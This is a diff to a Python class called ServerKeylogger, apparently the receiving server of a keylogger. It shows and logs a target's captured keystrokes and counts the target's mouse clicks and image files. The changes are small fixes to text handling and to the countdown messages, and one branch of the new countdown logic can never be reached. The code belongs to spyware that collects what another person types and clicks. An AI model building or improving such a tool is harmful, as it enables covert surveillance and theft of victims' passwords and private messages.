@@ -17,6 +17,7 @@ class ServerKeylogger:
         self.port = port
         self.simulater = simulater
         self.new_data = None
+        self.check_under = False
 
     def message(self, real_data):
         # To know if the server has some issues
@@ -24,7 +25,12 @@ class ServerKeylogger:
             if "{" == zeichen:
                 # "{" this detects if a space or a tab is in full_msg
                 self.new_data = real_data.replace("{", " ")
+                self.check_under = True
 
+        if self.check_under is False:
+            self.new_data = real_data
+
+        print(self.check_under)
         # The data is being stored in full_msg
         bp.color(f"Text of target: {self.new_data}", "magenta")
         zeit = time.strftime("%H-%M-%S-%Y")
@@ -66,7 +72,12 @@ class ServerKeylogger:
         minutes = seconds // 60
         this_min = minutes * 60
         this_sec = seconds - this_min
-        print(f"This simulation will last for {minutes} minutes and {this_sec} seconds\n")
+        if minutes > 0:
+            print(f"This simulation will last for {minutes} minutes and {this_sec} seconds\n")
+        elif minutes > 0 and this_sec == 0:
+            print(f"This simulation will last for {minutes} minutes\n")
+        elif minutes == 0:
+            print(f"This simulation will last for {this_sec} seconds\n")
 
         while seconds:  # Same like Timer Class
             mins, secs = divmod(seconds, 60)
@@ -140,7 +151,6 @@ class ServerKeylogger:
                 bp.color("The target hasn't typed and clicked anything", "magenta")
 
             else:
-                print(full_msg)
                 spalten = full_msg.split("***%§§)§§%")
                 # This splits the data with the special code
                 if spalten[1] != "":
@@ -212,6 +222,8 @@ class ServerKeylogger:
                 seconds = round(summed_up)
 
                 print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
+                print(f"{len(img_files)} Image files are being used")
+
                 threading_count = threading.Thread(target=self.countdown)
                 # The countdown will start
                 threading_count.start()
